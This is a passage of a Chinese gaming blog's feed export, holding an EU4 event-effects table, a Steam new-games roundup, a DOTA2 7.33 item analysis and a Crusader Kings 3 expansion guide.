class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br></pre></td><td class="code"><pre><span class="line">siamese_rev.7        暹罗革命        正统信仰容忍+1 间谍察觉+15        (新君414,会吃统治者,不吃继承人)</span><br><span class="line">        siamese_rev.8        帕碧罗阇被捕        间谍察觉-15 思潮传播+15      </span><br><span class="line">        9484        婚礼钟声        年度威望+1              </span><br><span class="line">        emp_mission_events.8        勃兰登堡的命运        联统\卫戍小勃,获得帝国默许      </span><br><span class="line">        emp_mission_events.9        萨克森的命运        联统萨克森,获得帝国默许      </span><br><span class="line">        burghers_estate_events.17        商人公会摇摆不定的忠诚        治下热带省份获得移民+10发展成本-5        中文描述有误,有时间可以验证下英文描述</span><br><span class="line">        league_events.1        建立奥格斯堡同盟        对法兰西建立包围网      </span><br><span class="line">        league_events.1        康布雷同盟        对威尼斯包围网      </span><br><span class="line">        fetishist_flavor.304        先祖的土地        正统+0.5 月度本地自治+0.08      </span><br><span class="line">        flavor_ada.100        阿达尔-埃塞俄比亚战争        陆军士气+5 人力恢复+10 每月虔诚+0.1        </span><br><span class="line">        flavor_ara.2        海洋法典        贸易效率+5 全局贸易竞争+10 年度威望+0.25 外交科技花费-5      </span><br><span class="line">        flavor_azt.4        限奢法令与战士文化        每月厌战-0.05 训练度+0.25      </span><br><span class="line">        flavor_azt.7        三部落同盟的权力平衡        每月自治+0.02 行政花费-5        有负面效果,自己斟酌</span><br><span class="line">        flavor_azt.8        尼扎华克尧特的法制改革        每月自治-0.03      </span><br><span class="line">        flavor_bah.1        比德尔,巴赫曼尼实际意义上的首都        首都 年度威望+0.5 本地防御效率+25      </span><br><span class="line">        flavor_bah.4        忠诚的希迪人        防御效率+5      </span><br><span class="line">        flavor_bah.5        德干人与西方人        稳定花费+10 陆军士气+5 \稳定花费+10 全国叛乱-1      </span><br><span class="line">        flavor_bav.5        公爵邀请基督会前来巴伐利亚        异端容忍-2 年度教廷影响+1      </span><br><span class="line">        new_flavour_bav.10        将选帝侯席位转交巴伐利亚        夺取普法尔茨选帝侯身份      </span><br><span class="line">        new_flavour_bav.11        科隆次子领        实施科隆次子领 主教选帝侯只会选出同家族成员        kill kol试了一下,并没有选上来带家族的主教选帝侯,迷,有时间验证下自然继承</span><br><span class="line">        new_flavour_bav.18        宗教授权令        抵抗宗教改革+50 教士忠诚均衡点-5      </span><br><span class="line">        flavor_bng.12        老虎凯旋        首都+4+3+3 政府等级直接升级到帝国      </span><br><span class="line">        flavor_boh.1        胡斯派信徒卷土重来!        转教胡斯      </span><br><span class="line">        flavor_boh.2        异端国王        转教天主      </span><br><span class="line">        flavor_boh.7        胡斯的传承        转教新教      </span><br><span class="line">        flavor_brapru.3        普鲁士的非洲贸易公司        贸易引导+5      </span><br><span class="line">        flavor_brapru.5        腓特烈威廉的专制主义        每月自治-0.05 专制度最大值+20      </span><br><span class="line">        flavor_brapru.25        阿喀琉斯家规        稳定花费-10 继承人概率+25      </span><br><span class="line">        flavor_brapru.27        统一法律制度        行政科技花费-10      </span><br><span class="line">        flavor_brapru.32        无忧宫        波茨坦(1759) 顾问花费-5 可能顾问+2      </span><br><span class="line">        new_flavour_bur.4        洛泰尔的遗产        成立洛塔林尼亚        任务树极其强大 强烈推荐</span><br><span class="line">        new_flavour_bur.5        宫廷赞助人        威望衰减-2 陆战带来威望+50      </span><br><span class="line">        flavor_byz.2        君士坦丁堡牧首区修复东西教会大分裂        转教东正      </span><br><span class="line">        flavor_cha.1        伊斯兰教在占婆        转教逊尼      </span><br><span class="line">        flavor_daimyo.18        西京        周防(1017) 本地发展成本-10 年度威望+0.5      </span><br><span class="line">        flavor_daimyo.22        安土城        京都(1020) 本地防御效率+10 年度正统+0.25      </span><br><span class="line">        flavor_dan.3307        虔信派        正统容忍+1\异端容忍+1      </span><br><span class="line">        flavor_eng.9100        罗拉德派异端邪说        正统容忍+1\异端容忍+2      </span><br><span class="line">        flavor_eng.9105        治安法官        稳定花费-10 直属州维护费-10      </span><br><span class="line">        flavor_eng.9107        星室法庭        稳定花费+5 全国叛乱-1      </span><br><span class="line">        flavor_eng.9111        皇家陆军        陆战威望+3 陆军传统+3 \ 海战威望+5 海军传统+5      </span><br><span class="line">        flavor_eng.9129        放纵法令和审查法案        传教+1 异端容忍-2\传教-1 异端容忍+2              </span><br><span class="line">        flavor_eth.26        盖申山 - 王山        继承人概率+20      </span><br><span class="line">        flavor_eth.30        建立永久首都        一级改革所罗门帝国 全国叛乱-2 训练+10 正统容忍+2 专制度最大+20      </span><br><span class="line">        flavor_eth.33        约柜的开启        所有点数花费-5      </span><br><span class="line">        flavor_fra.3123        法兰西学术院        行政科技花费-2.5      </span><br><span class="line">        flavor_fra.3125        凡尔赛宫        年度威望0.25 年度正统0.5      </span><br><span class="line">        flavor_fra.3139        马肖尔和5%税收        税收+5      </span><br><span class="line">        flavor_fra.3142        内克尔改革        年利息-0.25      </span><br><span class="line">        flavor_hab.3328        帝国枢密院        外交声望+1 理念花费-5      </span><br><span class="line">        flavor_hab.15        秘密机要处        间谍建设+10 间谍察觉+10      </span><br><span class="line">        flavor_hab.18        奥斯坦德公司        商人+1 全局贸易+5 殖民范围+25           </span><br><span class="line">        flavor_hol.3504        阿姆斯特丹证券交易所的建立        年利息-0.25\通胀-0.1        入市有风险,炒股需谨慎</span><br><span class="line">        flavor_hol.3508        尼德兰的加尔文宗        稳定花费+10 正统容忍+1 异端容忍-1 \ 稳定花费+10 正统容忍-1 异端容忍+1      </span><br><span class="line">        flavor_hol.3        荷兰语《国译圣经》        稳定花费-5 传教强度+1      </span><br><span class="line">        flavor_hol.7        埃尔塞维尔家族        阿姆斯特丹(97) 年度威望+0.5      </span><br><span class="line">        flavor_hol.9        福禄特帆船        阿姆斯特丹(97) 运输船花费-10      </span><br><span class="line">        flavor_inc.4        库斯科改造完毕        库斯科(808) 年度威望+0.5 年度正统+0.5      </span><br><span class="line">        flavor_inc.6        胡阿卡和皇家神庙        全国叛乱-1      </span><br><span class="line">        flavor_inc.7        沿海居民        稳定花费+10 行政科技花费-5 外交科技花费-5      </span><br><span class="line">        flavor_jap.15        座        全局贸易竞争力+20      </span><br><span class="line">        flavor_jap.16        独占座        移除座 贸易效率-10 全局贸易竞争力+20        坑 但如果非常想要40全局贸易竞争可以先16再15</span><br><span class="line">        flavor_jap.27        国学        全国叛乱-0.5 稳定花费-0.5 理念花费-0.5      </span><br><span class="line">        flavor_jap.59        伊势神宫        转神道教      </span><br><span class="line">        flavor_jnp.7        南亚大干道        贸易效率+5      </span><br><span class="line">        flavor_kbo.3        强制实行伊斯兰正统教法        正统容忍+1 异教容忍-2      </span><br><span class="line">        flavor_kbo.4        与造王者相处        税收+10      </span><br><span class="line">        10502        申闻鼓院        全国叛乱-1 稳定花费-5      </span><br><span class="line">        flavor_kor.7        菊花王座        首都 全局发展成本-5 本地发展成本-5 年度威望+0.5      </span><br><span class="line">        flavor_lna.1        玉佛        首都 年度威望+0.5      </span><br><span class="line">        flavor_mal.4        与葡萄牙的贸易往来        贸易效率+3 骑兵花费-5      </span><br><span class="line">        flavor_mal.6        贵族的伊斯兰化        传教强度+1 异教容忍-1      </span><br><span class="line">        flavor_mal.40        崭新的朝圣行程        正统容忍+1 年度正统+0.5      </span><br><span class="line">        flavor_mch.6        驱逐耶稣会士        科研花费-5      </span><br><span class="line">        flavor_mng.5        闭关锁国        省份贸易竞争+40 理念花费+10 思潮传播-10 \ 省份贸易竞争-25 理念花费-10 思潮传播+10      </span><br><span class="line">        flavor_msi.6        莫西邦联政府改革        每月自治度-0.05 每年专制度+0.25 最大专制度+10      </span><br><span class="line">        flavor_oir.2        俘获明朝天子        君主修正 陆军士气+20 围城能力+25        土木堡</span><br><span class="line">        flavor_ori.1        迦阇波底王国与扎格纳特崇拜        税收-5 正统容忍+1      </span><br><span class="line">        flavor_orl.10        贞德封圣        正统容忍+1 要塞防御+20      </span><br><span class="line">        flavor_per.9        纳杰夫        塞马沃(2311) 年度正统+0.5      </span><br><span class="line">        flavor_per.17        伊斯法罕半天下        伊斯法罕(429) 年度正统+1      </span><br><span class="line">        pirates.9/21/22/23        林道乾集团/重回倭寇时代/吕根岛的海盗/彭赞斯的海盗        转海盗共和国      </span><br><span class="line">        flavor_pol.14        霍修斯神学院        ermland(42) 年度教廷影响力+1 对异端传教强度+1      </span><br><span class="line">        flavor_por.3266        殖民政策        全局移民+10      </span><br><span class="line">        flavor_por.4        葡萄牙东印度公司        贸易效率+10      </span><br><span class="line">        rus.28/10/16/25/22/26                13 23         俄罗斯这几个顺序不能倒换，倒换会有后边buff把前边顶掉的情况</span><br><span class="line">        new_flavour_sav.2        圣莫里斯和拉撒路骑士团        传教强度+2 年度教廷影响+0.5      </span><br><span class="line">        flavor_sco.6        苏格兰东印度公司        贸易效率+10      </span><br><span class="line">        flavor_sco.8        格拉斯哥商会        国外贸易竞争力+10      </span><br><span class="line">        flavor_ser.4        第三罗马        首都 年度正统+1      </span><br><span class="line">        flavor_son.12        xx的根        转拜物教\改善关系+10      </span><br><span class="line">        flavor_spa.1003        西印度交易所        定居概率+1 全局移民+5      </span><br><span class="line">        flavor_spa.4        统一西班牙        稳定花费+5 每月自治-0.05      </span><br><span class="line">        flavor_sun.1        逊尼派信仰        传教强度+1 正统容忍+1      </span><br><span class="line">        flavor_swe.1        古斯塔夫瓦萨的中央集权改革        每月自治-0.05      </span><br><span class="line">        flavor_swe.3228        古斯塔夫阿道夫军事改革        陆军士气+5 步兵花费-10\雇佣兵维护费-10 雇佣兵人力+50 更多佣兵\海军士气+5 重船花费-10        </span><br><span class="line">        flavor_swe.3231        重商主义改革        省份贸易竞争力10 \ 贸易效率10      </span><br><span class="line">        flavor_swe.3232        专制主义        每月自治-0.05 最大专制度+20      </span><br><span class="line">        flavor_swe.3235        上诉法院        稳定花费-10      </span><br><span class="line">        flavor_swe.3244        军队大整编        陆军维护-10      </span><br><span class="line">        flavor_swe.3247        产品法        贸易效率+5 贸易范围+10      </span><br><span class="line">        flavor_swe.3248        非国教徒秘密集会赦令        正统容忍+1 \ 异端容忍+1      </span><br><span class="line">        flavor_swe.3263        统一与安全法        全国叛乱-1      </span><br><span class="line">        flavor_swe.3264        农业大改革        生产效率+5      </span><br><span class="line">        flavor_swe.3246        阿尔维德霍恩与自由时代        最大专制度-20 全国叛乱-1 会覆盖3232 自行调整顺序      </span><br><span class="line">        flavor_swi.10        垄断佣兵        陆战威望+10 佣兵人力+25      </span><br><span class="line">        flavor_tur.3367        大海军改革        船只花费-5      </span><br><span class="line">        flavor_tur.100        耶尼切里        人力恢复10 步兵作战5 训练度2.5        不满足条件会消失</span><br><span class="line">        flavor_ven.9        道明会宗教裁判所        异端容忍+2 教廷影响-2 宗教统一+10\传教强度+1 异端容忍-2 教廷影响+2      </span><br><span class="line">        flavor_ven.18        海军募兵        稳定花费+5 海军上限+10      </span><br><span class="line">        flavor_ven.24        十人会权力扩张        稳定花费+10 年度共和传统+0.1\年度共和传统-1 自治-0.05      </span><br><span class="line">        flavor_ven.26        扩张大议会        年度共和传统+0.1      </span><br><span class="line">        flavor_ven.28        朱提卡学院        年度共和传统+0.2      </span><br><span class="line">        flavor_ven.31        贵族减少        税收+5      </span><br><span class="line">        flavor_ven.37        威尼斯画派与乐派        年度威望+1      </span><br><span class="line">        flavor_vij.21        胜利之城        首都 年度威望+1      </span><br><span class="line">        flavor_zan.2        基尔瓦编年史        年度正统+0.5      </span><br><span class="line">        free_cities.9        海关和税收优惠        贸易效率+5 全局贸易竞争力+10      </span><br><span class="line">        free_cities.15        城邦同盟的成员        全国叛乱-1 全局贸易竞争力+5 国家人力+10 陆军上限+25      </span><br><span class="line"></span><br><span class="line">        incidents_bur_inheritance.6        勃艮第继承制度        女性顾问+20 改善关系+10      </span><br><span class="line">        knights_missions.1        永久教廷使节        年度威望+1 教廷影响力+1        有误</span><br><span class="line">        mch_missions.7        蒙古人再一统        蒙古文化变主流文化\蒙古科尔沁喀尔喀瓦剌文化相容 可接受文化+3      </span><br><span class="line">        muslim_piety.6        限制齐米建筑        正统容忍+0.5 异教容忍-0.5      </span><br><span class="line">        nahuatl_events.32        宫廷中的第三性        可能顾问+1 女性顾问+10      </span><br><span class="line">        nahuatl_events.321        军队中的第三性        人力恢复+10 可招募女性将领      </span><br><span class="line">        native_federations_event.6        团结起来对抗世界        要塞防御+10      </span><br><span class="line">        polynesian.42        梅内胡内的祝福        统治者三维+1+1+1      </span><br><span class="line">        759        日耳曼首席主教        年度威望+1 外交声誉+1        异教徒会被开除哦</span><br><span class="line">        religious_events.15        宋明理学复兴        异端容忍+2        </span><br><span class="line">        subject_interaction_events.14        禁运和走私        贸易效率+5 税收+1      </span><br><span class="line">        synthetic_dawn.5        时空裂隙        骑兵作战+50 陆军火力+33        仅限中美洲信仰国家</span><br><span class="line">        papacy_events.14/15/16        赎罪券/买卖圣职/圣髑交易        年度税收+5+5+5        (非百分比,就是+5)</span><br><span class="line">        usa_dlc.4        邦联条例        年度威望+2      </span><br><span class="line">        usa_dlc.12        奴隶贸易        稳定花费-10      </span><br><span class="line">        usa_dlc.13        可导致弹劾的罪名        陆军士气+10 间谍察觉-10      </span><br><span class="line">        usa_dlc.42        美国第一银行        税收+10 年利息-2      </span><br><span class="line">        india_mission_events.3        孔雀王座        首都 年度正统+1      </span><br><span class="line">        india_mission_events.4        恒河浴        稳定花费-10 传教强度+1      </span><br><span class="line">        buddhism_events.33        有用的同盟?        转教金刚乘 正统容忍+1 年度正统+1      </span><br><span class="line">        conquest_of_paradise.318        加强民兵建设        陆军上限+10 要塞防御+10      </span><br><span class="line">        cultural_event.8        公文体        年度正统+1      </span><br><span class="line">        cultural_event.9        茶道        年度威望+0.5      </span><br><span class="line">        dotf.9        xx信仰的崛起        正统容忍+1 外交声誉+1      </span><br><span class="line">        devotion_events.204        受教育的女性        顾问花费-10 女性顾问+20      </span><br><span class="line">        mug_mission_events.1        德干的总督        10行政效率      </span><br><span class="line">        court_and_country_events.100        宫廷与外省之间的对立走向终结        专制度最大值        详见百科,不满足条件时触发只会产生坏影响</span><br><span class="line">        english_civil_war.1        英国内战        转共和 一级改革护国议会      </span><br><span class="line">        personality_events.25        非正义战争        省份战争分数-10        君主</span><br><span class="line">        napoleon.2        帝国宣传        行政效率+5        时限</span><br><span class="line">        dotf.1        弱势信仰的守护者        传教+2/异教战争分数-25        时限</span><br><span class="line">        flavor_hab.16        梅尔希奥克莱西        传教士+1传教+1        君主</span><br><span class="line">        flavor_pap.4        重建宗教裁判所        传教+2/传教+5 异端容忍-2        时限(100年)</span><br><span class="line">        flavor_jap.6        兰学        传教+5        君主</span><br><span class="line">        fetishist_flavor.312        地动山摇之日        传教+5        时限(20年)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> P社 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> EU4 </tag>
            
            <tag> 欧陆风云4 </tag>
            
            <tag> 分享 </tag>
            
            <tag> 事件 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>画面真实到被怀疑是录像？FPS新游《未记录》一周60万愿望单！</title>
      <link href="/9cd26489.html"/>
      <url>/9cd26489.html</url>
      
        <content type="html"><![CDATA[<p><strong>01</strong></p><p>《未记录》</p><p>凭借超逼真的画面，新游<strong>《未记录》</strong>演示视频近日在Youtube、B站等平台获得极高播放量，从而获得了玩家们的广泛关注。</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-feb52de7c0f4a7af08017463fcac94d0.png"></p><p>开发商DRAMA 今日通过推特宣布，游戏在Steam上架一周后愿望单数量已破<strong>60万</strong>！</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-64acbf7aa2e8773056e61fbd69663b87.png"></p><p>商店页：s.team&#x2F;a&#x2F;2381520&#x2F;</p><p>《未记录》是一款战术射击游戏。游戏将以复杂的对话、创新的游戏机制、艰难的道德困境和独特的射击系统为特色。在这款游戏中，玩家需要调查几个刑事案件，并面对各种各样的角色。游戏的情节和呈现将是体验的核心，玩家可以预期一系列的事件以及无数的情节转折。</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-feec071dda2734da5c0c2ac3f56ff8d7.jpeg"></p><p>《未记录》最大的特点是它的随身摄像机视角。游戏将提供一个自由瞄准系统，具有真实的ADS和无限制的手部运动。</p><p><strong>02</strong></p><p>《量子破碎》</p><p>本月早些时候，<strong>《量子破碎》</strong>由于许可证问题，被迫从各游戏商店和XGP中移除。</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-d23aabb7e032e9db47633e3b1fc9eea7.png"></p><p>商店页：s.team&#x2F;a&#x2F;474960&#x2F;</p><p>而今日，《量子破碎》已正式回归包括Steam商店在内的所有数字商店平台和XGP游戏库。</p><p><strong>03</strong></p><p>《霸剑霄云录》</p><p>3D奇幻武侠角色扮演游戏<strong>《霸剑霄云录》</strong>现已发售，售价69元。</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-e7f6a04bf1fa8b151c39579295e14b90.png"></p><p>商店页：s.team&#x2F;a&#x2F;2159730&#x2F;</p><p>这是一款以重现经典奇幻武侠风格为目标的3D角色扮演游戏，玩家将在其中扮演在绝谷中长大的少年申子隽，在一场壮大的旅程中寻找真实的自己与被遗忘已久的惊天秘密。</p><p>游戏当前累计好评率88%，有试玩Demo可供下载体验。</p><p><strong>04</strong></p><p>《志怪者》</p><p>多剧本调查冒险游戏<strong>《志怪者》</strong>Steam“抢先体验”版 现已发售，定价36元，首周9折优惠，售价低至32.4元。</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-205da1657199269aac9ec6a435b1ee90.png"></p><p>商店页：s.team&#x2F;a&#x2F;2162020&#x2F;</p><p>游戏EA版本包含4个剧本、5位调查员、150多张卡牌。游戏提供了灾难逃生、民俗调查、秘境探险、悬疑推理等多种类剧本主题，玩家可扮演能力出众的调查员，通过场景探索和卡牌战斗，不断挖掘隐藏的故事真相，抵达不同结局。</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-013b5b0c619c7d22d5d7b6abfb2667e5.gif"></p><p>游戏的多分支、随机玩法、骰点要素也是亮点，整体类似线上沉浸式密室+剧场体验。当前好评率90%。</p><p><strong>05</strong></p><p>《镇邪》</p><p>单机国风道士题材游戏<strong>《镇邪》</strong>宣布游戏销量现已突破<strong>10万份</strong>。</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-acec604e18c82b52e9c5fc795549093b.png"></p><p>商店页：s.team&#x2F;a&#x2F;1939560&#x2F;</p><p>该作于2022年11月4日登陆Steam，售价48元，目前整体测评为“特别好评”。</p><p>《镇邪》根据大量的民间故事改编，在游戏中，玩家将扮演道门弟子前往神秘村庄调查身世之谜，不想却无意中卷入一场巨大的阴谋。除了体验丰富的游戏主线剧情之外，玩家还可以体验到摸金寻宝，驱邪镇灵，开坛做法，画符炼尸等多种传统的国风元素。</p><p><strong>06</strong></p><p>《日本漂移大师》</p><p>赛车游戏<strong>《日本漂移大师》</strong>上架Steam商店，游戏支持简体中文，发售日期待定。</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-9f96b41dc95a2f512d6cc1eb81f05fc8.png"></p><p>商店页：s.team&#x2F;a&#x2F;1153410&#x2F;</p><p>游戏中玩家可以打造属于自己的日系风格赛车，沉浸在充满活力、昼夜往复、熙熙攘攘和拥有天气系统的日本小镇的氛围之中，在多种赛道与知名地点中测试自己的赛车性能与漂移技巧，并体验一个关于外国人在日本漂移赛场上想要成名的故事。</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-9632a1a18a77daa4499d4b828a9f841c.jpeg"></p><p><strong>07</strong></p><p>《求生岛》</p><p>沉浸式生存探险游戏<strong>《求生岛：不老泉传说》</strong>现已在 Steam开启抢先体验，售价84.64元。</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-92854f4c4698a7779be3f32877bf17ce.png"></p><p>商店页：s.team&#x2F;a&#x2F;1967630&#x2F;</p><p>游戏灵感来源于航海大发现时代的真实历史事件，玩家将扮演一位在船难事故中幸存下来的十六世纪探险家，制作工具与庇护所，解开围绕着古老文明与你自身命运的秘密。</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-71788885ff607fdd580e5a140c667bb2.gif"></p><p>游戏支持简体中文，当前累计好评率82%。</p><p><strong>08</strong></p><p>《末光》</p><p>沉浸式动作冒险游戏<strong>《末光》</strong>现已推出，售价92元，首周9折优惠，折后82.8元。</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-bfb419a50e24be4b10197e690c472ccd.png"></p><p>商店页：s.team&#x2F;a&#x2F;2162020&#x2F;</p><p>玩家将扮演一盏小小的、正在成长的莹光，通过动态色彩协调的战斗系统对抗怪物，在橙色和蓝色状态之间切换以抵挡敌人的攻击并吸收他们的能量，精确地反击，平息怪物的不安，将他们从内心的恶魔中解放出来。</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/wxsync-2023-04-88ba61c116a6062b40d532fae409db27.gif"></p><p>游戏支持简体中文，当前累计好评率69%。</p><blockquote><p>本篇文章来源于微信公众号: Steam游戏日夜</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> steam </tag>
            
            <tag> 游戏 </tag>
            
            <tag> 推荐 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DOTA2 7.33新物品分析：长盾在手，宝冕加身</title>
      <link href="/27515828.html"/>
      <url>/27515828.html</url>
      
        <content type="html"><![CDATA[<p><strong>新物品介绍</strong></p><p>在7.33版本中，推出了7件全新的物品，涵盖了游戏的前中后期，让英雄在装备选择上，又有了全新的路线。本文将简单分析各个道具所契合的英雄以及原因。  </p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/16410.png" alt="图片"></p><p>【血腥榴弹】</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/16411.png" alt="图片"></p><p>前期非常强力的进攻性道具，65金的价格，换来125点伤害，15%的减速。适合有击杀机会的边路英雄组合购买。 与蝙蝠骑士相当契合的一件道具，持续伤害可以被蝙蝠骑士的“粘性燃油”提升，在前期可以极大地提升蝙蝠的击杀能力。 </p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/16412.png" alt="图片"></p><p><strong>【鱼叉】</strong></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/16413.png" alt="图片"></p><p>连击刀的上位合成，需要1000金的宝冕和1000金的图纸。 优点：合成平滑，提供的属性多，主动效果用途灵活，提供的属性也相当不错，20力量、10敏捷、16智力。 增加了主动技能：钩捕，效果类似混沌骑士的二技能“实相裂隙”。将自身和敌人牵引至更近的位置。 提供的主动技能“钩捕”让他比较适合需要切入的英雄。比如：<strong>斯温、斯拉达</strong>，可以用“鱼叉”代替原本的连击刀+跳刀的出装。 而有些英雄如果有更好的切入装备选择，或是自带切入，“鱼叉”对于他们来说优先级就没这么高，比如：斯拉克，A杖对于小鱼人提供的两段跳的效果比“鱼叉”更加优秀。 另外，“鱼叉”和一些技能组合在一起，能产生相当imba的效果，例如：马格纳斯，马格纳斯的三技能“巨角冲撞”和“钩捕”的效果完美契合，可以稳定将敌人拱回来。</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/16414.png" alt="图片"></p><p>【散魂剑】</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/16415.png" alt="图片"></p><p>优点：主动效果可以解buff 原本出散失的英雄有：幻影长矛手、力丸、熊战士、齐天大圣、娜迦海妖。 在面对沉默、缠绕、减速类buff技能时，英雄可以选择优先升级这件道具，比如对面有天怒，大树、剧毒。但是在属性面板上，仅仅提供攻击力的加成，削蓝的效果也没有任何提升，因此对幻影长矛手、娜迦海妖这类需要提升幻象质量的英雄来说，优先级很低。 另外主动的净化效果，对于当前版本的显影之尘使用时，要记得走出范围再净化，并且如果再次走进显影之尘的范围内，又会被上到显影的debuff。</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/16416.png" alt="图片"></p><p><strong>【灵匣】</strong></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/16417.png" alt="图片"></p><p>这件道具提供了血量和蓝量的补充，被动效果“法术强化”，看上去非常契合拥有多个指向性技能的英雄，但实际上内置的6秒CD让这件道具更加适合一些拥有短CD指向性技能的法师，比如：天怒法师、帕格纳、宙斯。 而其他拥有较多单体指向性技能的英雄，类似：莱恩、暗影萨满，依旧还是以太、跳刀、推推棒对他们来说更加合适。 <strong>【长盾】</strong></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/16418.png" alt="图片"></p><p>与宝冕一样，是一件全新的合成物品，提供了回蓝、护甲、生命，以及一个主动释放的护盾。 看上去效果类似“回蓝版”的先锋盾。 由于没有上位合成且不可拆分，不像先锋盾可以合成赤红甲或是大晕锤，大哥位的英雄一般不太会选择“长盾”，这件道具可能更加适合一些力量辅助来出，比如：尸王、发条技师，大地之灵。 <strong>【宝冕、丰饶之环】</strong></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/16419.png" alt="图片"></p><p>这两件装备没有什么太多可以介绍的，都是升级物品的合成配方，唯一影响的就是现在部分出狂战或者林肯的1号位在前期需要更多的来购买吃树了，丰饶之环1200的价格不像之前825的治疗指环这么容易出到了。 <strong>总结：</strong> 7.33版本的物品更新，让连击刀、净魂之刃两件中期道具在后期有了更多的选择，整体的游戏性得到了提升。上文所提到的一些思路只是抛砖引玉，如果有更加好的思路和理解，也可以在评论中分享。</p>]]></content>
      
      
      <categories>
          
          <category> 分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> dota2 </tag>
            
            <tag> 更新内容 </tag>
            
            <tag> 比赛 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>三代人重建罗马帝国，快速扩张指南</title>
      <link href="/1625.html"/>
      <url>/1625.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/image-42-1024x640.png"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/image-43-1024x640.png"></p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/04/image-44-1024x640.png"></p><p>罗马的法理是根据已有的帝国头衔。尽量多建几个帝国。<br>用的第一个剧本的阿尔弗雷德，创建了支系，所以家族名字不一样。</p><p>1.开局伯爵，直接点财富重心，第一个技能选行政家的能者居之。<br>2.阿尔弗雷德有宣称，所以直接吃下几块有宣称的伯爵地皮。<br>3.建立宣称派系，要小王国爵位。这局不流血就成功了。<br>4.西法兰克是最富的西欧王国，就差几块地就能建立帝国，所以第一个篡夺目标选西法兰克。<br>5.找个容易打的目标接壤西法兰克，一块地的小伯爵很好杀的，别看兵多，北欧人闲不住的，多半全都去揍人了，搞点野驴炮他还没回家直接搞定。<br>6.成了西法兰克封臣，间谍放在国王首都焦点找出秘密，不要要挟，直接曝光，然后就等国王到处抓罪犯，得罪人。<br>7.针对国王建个宣称权位计谋，搞到王位。<br>8.注意压力值，在左下角头像左边的压力条。超过七十就开宴会或者狩猎，所以钱的把控要注意，可以找教宗虔诚换钱。<br>9.焦点改外务重心，先点交个朋友，然后奥古斯都那条线点到真命领主。<br>10.搞到王位宣称就拉宣称派系，和大封臣搞好关系。<br>11.等国王出征揍人，最好输了。派系170%直接不流血上位。虽然西法兰克不止一个王爵，不过他会自己销毁阿基坦然后被篡位。<br>12.帮你的大封臣会得到牵制，他们的要求会不少，不过是小事。<br>13.当上国王就寻找接壤拜占庭的机会，再来一次夺位。<br>14.当上皇帝以后如果有了真命领主就可以改权威重心 点正义之战。大量外交附庸。<br>15.有了正义之战回去点君权重心，补齐奥古斯都那些加威望的技能。<br>16.用之前的交友计划和邀请值大于-70的王国宣称者交友，邀请到宫廷。最好没结婚，和家族的人交配一下。（对异教徒有效）<br>17.帮好友拿到王国。会成为你的封臣。<br>18.帝国继承法一定要改成选举，掌玺大臣选国内事务。财政总管万年提升发展度，军事统帅训练将领为主。<br>19.为了打罗马，我改宗圣像破坏派，来了一次圣战。改宗只要250虔诚很划算的。<br>20.阿拉伯帝国的王子搞到手就和家族成员交配，如果是强宣称就不急，弱宣称就帮他拿帝位，杀掉，家族成员继承后用外交中的宣称头衔（族长互动）拿头衔再打一遍。</p>]]></content>
      
      
      <categories>
          
          <category> P社 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CK3 </tag>
            
